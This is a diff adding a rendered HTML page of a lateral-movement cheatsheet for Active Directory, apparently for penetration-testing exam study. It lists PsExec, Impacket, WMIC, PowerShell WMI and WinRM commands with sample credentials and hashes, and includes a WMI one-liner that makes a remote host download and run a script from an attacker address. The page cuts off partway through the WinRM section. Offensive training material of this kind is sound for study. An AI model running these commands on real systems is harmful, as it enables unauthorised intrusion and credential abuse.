+        <li class="md-nav__item">
+  <a href="#winrm-windows-remote-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      WinRM (Windows Remote Management)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="WinRM (Windows Remote Management)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-powershell-remoting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using PowerShell Remoting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-evil-winrm" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Evil-WinRM
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-server-message-block" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB (Server Message Block)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SMB (Server Message Block)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-smbclient" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using smbclient
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-smbexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Impacket SMBExec
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mounting-smb-shares" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mounting SMB Shares
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rdp-remote-desktop-protocol" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP (Remote Desktop Protocol)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="RDP (Remote Desktop Protocol)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-xfreerdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using xfreerdp
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-rdesktop" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using rdesktop
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pass-the-hash-pth" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-the-Hash (PTH)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Pass-the-Hash (PTH)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Impacket Tools
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-crackmapexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using CrackMapExec
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-mimikatz-pth" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Mimikatz PTH
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dcom-distributed-component-object-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      DCOM (Distributed Component Object Model)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DCOM (Distributed Component Object Model)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-dcomexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Impacket DcomExec
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-powershell-dcom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using PowerShell DCOM
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scheduled-tasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scheduled Tasks
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Scheduled Tasks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-schtasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using schtasks
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-atexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Impacket AtExec
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows Services
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Windows Services">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-scexe" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using sc.exe
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using PowerShell
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#crackmapexec-swiss-army-knife" class="md-nav__link">
+    <span class="md-ellipsis">
+      CrackMapExec (Swiss Army Knife)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="CrackMapExec (Swiss Army Knife)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-usage" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Usage
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#command-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Command Execution
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-dumping" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credential Dumping
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#module-usage" class="md-nav__link">
+    <span class="md-ellipsis">
+      Module Usage
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-registry" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Registry
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Remote Registry">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-regexe" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using reg.exe
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-powershell_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using PowerShell
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement-with-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lateral Movement with Credentials
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Lateral Movement with Credentials">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#credential-formats" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credential Formats
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#quick-lateral-movement" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Lateral Movement
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exam-scenarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exam Scenarios
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exam Scenarios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scenario-1-you-have-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 1: You Have Password
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-2-you-have-ntlm-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 2: You Have NTLM Hash
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-3-pivot-through-multiple-hosts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 3: Pivot Through Multiple Hosts
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-4-spray-and-move" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 4: Spray and Move
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Reference
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Quick Reference">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#essential-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Essential Commands
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tool-selection-guide" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tool Selection Guide
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pro-tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pro Tips
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troubleshooting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Troubleshooting
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Troubleshooting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#common-issues" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Issues
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resources
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Summary">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#most-common-lateral-movement-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Most Common Lateral Movement Commands
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lateral-movement-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lateral Movement Flow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remember" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remember
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="lateral-movement-cheatsheet">Lateral Movement Cheatsheet</h1>
+<h2 id="overview">Overview</h2>
+<p>Lateral movement is the technique of moving through a network from one compromised system to another. This cheatsheet covers practical lateral movement techniques for Active Directory environments in .</p>
+<hr />
+<h2 id="prerequisites">Prerequisites</h2>
+<h3 id="what-you-need">What You Need</h3>
+<ul>
+<li>[ ] Compromised credentials (password or hash)</li>
+<li>[ ] Valid domain account</li>
+<li>[ ] Network connectivity to target</li>
+<li>[ ] Administrative privileges (for most techniques)</li>
+<li>[ ] Target hostname or IP address</li>
+</ul>
+<h3 id="credential-types">Credential Types</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c"># Username and Password</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">DOMAIN</span><span class="p">\</span><span class="n">username</span> <span class="p">:</span> <span class="n">password</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c"># NTLM Hash</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="n">DOMAIN</span><span class="p">\</span><span class="n">username</span> <span class="p">:</span> <span class="n">NTLM_HASH</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="c"># Kerberos Ticket</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span> <span class="n">file</span>
+</span></code></pre></div>
+<hr />
+<h2 id="psexec">PsExec</h2>
+<h3 id="using-sysinternals-psexec">Using Sysinternals PsExec</h3>
+<p><strong>Basic Usage:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a># With credentials
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>psexec.exe \\TARGET -u DOMAIN\username -p password cmd.exe
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a># As SYSTEM
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>psexec.exe \\TARGET -u DOMAIN\username -p password -s cmd.exe
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a># Interactive session
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>psexec.exe \\TARGET -u DOMAIN\username -p password -i cmd.exe
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a># Copy executable
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>psexec.exe \\TARGET -u DOMAIN\username -p password -c payload.exe
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a># Execute and return output
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>psexec.exe \\TARGET -u DOMAIN\username -p password ipconfig
+</span></code></pre></div></p>
+<h3 id="using-impacket-psexec">Using Impacket PsExec</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># With password</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>impacket-psexec<span class="w"> </span>DOMAIN/username:password@TARGET
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>impacket-psexec<span class="w"> </span>DOMAIN/username:password@192.168.1.100
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c1"># With NTLM hash</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>impacket-psexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLM_HASH<span class="w"> </span>DOMAIN/username@TARGET
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>impacket-psexec<span class="w"> </span>-hashes<span class="w"> </span>:e19ccf75ee54e06b06a5907af13cef42<span class="w"> </span>CORP/admin@192.168.1.100
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="c1"># With Kerberos</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>impacket-psexec<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>DOMAIN/username@TARGET
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="c1"># Execute specific command</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>impacket-psexec<span class="w"> </span>DOMAIN/username:password@TARGET<span class="w"> </span><span class="s1">&#39;whoami&#39;</span>
+</span></code></pre></div>
+<p><strong>Examples:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Password authentication</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>impacket-psexec<span class="w"> </span>CORP/Administrator:P@ssw0rd@192.168.1.100
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># Hash authentication</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>impacket-psexec<span class="w"> </span>-hashes<span class="w"> </span>:e19ccf75ee54e06b06a5907af13cef42<span class="w"> </span>CORP/Administrator@DC01
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="c1"># Get shell</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>impacket-psexec<span class="w"> </span>CORP/user:pass@192.168.1.100<span class="w"> </span>cmd.exe
+</span></code></pre></div></p>
+<hr />
+<h2 id="wmi-windows-management-instrumentation">WMI (Windows Management Instrumentation)</h2>
+<h3 id="using-wmic">Using WMIC</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a># Execute command
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>wmic /node:TARGET /user:DOMAIN\username /password:password process call create &quot;cmd.exe /c whoami&quot;
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a># Execute payload
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>wmic /node:TARGET /user:DOMAIN\username /password:password process call create &quot;C:\temp\payload.exe&quot;
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a># Multiple targets
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>wmic /node:@targets.txt /user:DOMAIN\username /password:password process call create &quot;cmd.exe&quot;
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a># Get process list
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>wmic /node:TARGET /user:DOMAIN\username /password:password process list brief
+</span></code></pre></div>
+<h3 id="using-impacket-wmiexec">Using Impacket WMIExec</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># With password</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>impacket-wmiexec<span class="w"> </span>DOMAIN/username:password@TARGET
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>impacket-wmiexec<span class="w"> </span>CORP/Administrator:P@ssw0rd@192.168.1.100
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># With NTLM hash</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>impacket-wmiexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLM_HASH<span class="w"> </span>DOMAIN/username@TARGET
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>impacket-wmiexec<span class="w"> </span>-hashes<span class="w"> </span>:e19ccf75ee54e06b06a5907af13cef42<span class="w"> </span>CORP/admin@192.168.1.100
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="c1"># Execute command</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>impacket-wmiexec<span class="w"> </span>DOMAIN/username:password@TARGET<span class="w"> </span><span class="s1">&#39;ipconfig&#39;</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="c1"># Semi-interactive shell</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>impacket-wmiexec<span class="w"> </span>CORP/user:pass@192.168.1.100
+</span></code></pre></div>
+<h3 id="using-powershell-wmi">Using PowerShell WMI</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c"># Create credential object</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;DOMAIN\username&#39;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c"># Execute command via WMI</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="nb">Invoke-WmiMethod</span> <span class="n">-Class</span> <span class="n">Win32_Process</span> <span class="n">-Name</span> <span class="n">Create</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;cmd.exe /c whoami&quot;</span> <span class="n">-ComputerName</span> <span class="n">TARGET</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="c"># One-liner</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="nv">$pass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;CORP\admin&#39;</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span> <span class="nb">Invoke-WmiMethod</span> <span class="n">-Class</span> <span class="n">Win32_Process</span> <span class="n">-Name</span> <span class="n">Create</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;powershell.exe -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.5/shell.ps1&#39;)&quot;</span> <span class="n">-ComputerName</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">100</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
+</span></code></pre></div>
+<hr />
+<h2 id="winrm-windows-remote-management">WinRM (Windows Remote Management)</h2>
+<h3 id="using-powershell-remoting">Using PowerShell Remoting</h3>
+<p><strong>Basic Commands:</strong>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c"># Test if WinRM is enabled</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nb">Test-WSMan</span> <span class="n">-ComputerName</span> <span class="n">TARGET</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c"># Create credential</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;DOMAIN\username&#39;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="c"># Enter interactive session</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="n">TARGET</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="c"># Execute command</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">TARGET</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">whoami</span> <span class="p">}</span>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="c"># Execute script</span>
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">TARGET</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-FilePath</span> <span class="n">C</span><span class="p">:\</span><span class="n">script</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>
